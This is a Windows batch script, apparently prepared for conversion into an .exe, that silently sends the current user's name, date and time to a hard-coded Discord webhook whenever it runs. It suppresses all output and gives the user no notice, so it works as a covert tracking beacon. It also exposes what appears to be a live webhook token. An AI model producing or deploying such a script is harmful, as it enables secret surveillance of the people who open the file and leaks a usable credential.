::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAnk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSDk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFDdBTwWRAES0A5EO4f7+086CsUYJW/IDQszpmfe7ZNNXy3PlZpIO9UJbnNEZMl5mKUD4IAosrA4=
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
:: Replace the URL below with your actual Discord Webhook URL
set "WEBHOOK_URL=https://discord.com/api/webhooks/1524602157913870467/xo38_DPb1IxPhcy7L9Ga7F3SqbkC5jR-2WOMKMxiSWLkQDSw2DoMa7dQfcI3u5CXvH7q"

:: Capture current windows user and system timestamp
set "USER=%USERNAME%"
set "CURRENT_DATE=%DATE%"
set "CURRENT_TIME=%TIME%"

:: Construct the JSON content payload (escaping inner quotes for Windows curl)
set "PAYLOAD={\"content\": \"**File Opened Alert**\\n**User:** %USER%\\n**Date:** %CURRENT_DATE%\\n**Time:** %CURRENT_TIME%\"}"

:: Send the data via curl
curl -H "Content-Type: application/json" -X POST -d "%PAYLOAD%" "%WEBHOOK_URL%" >nul 2>&1

exit



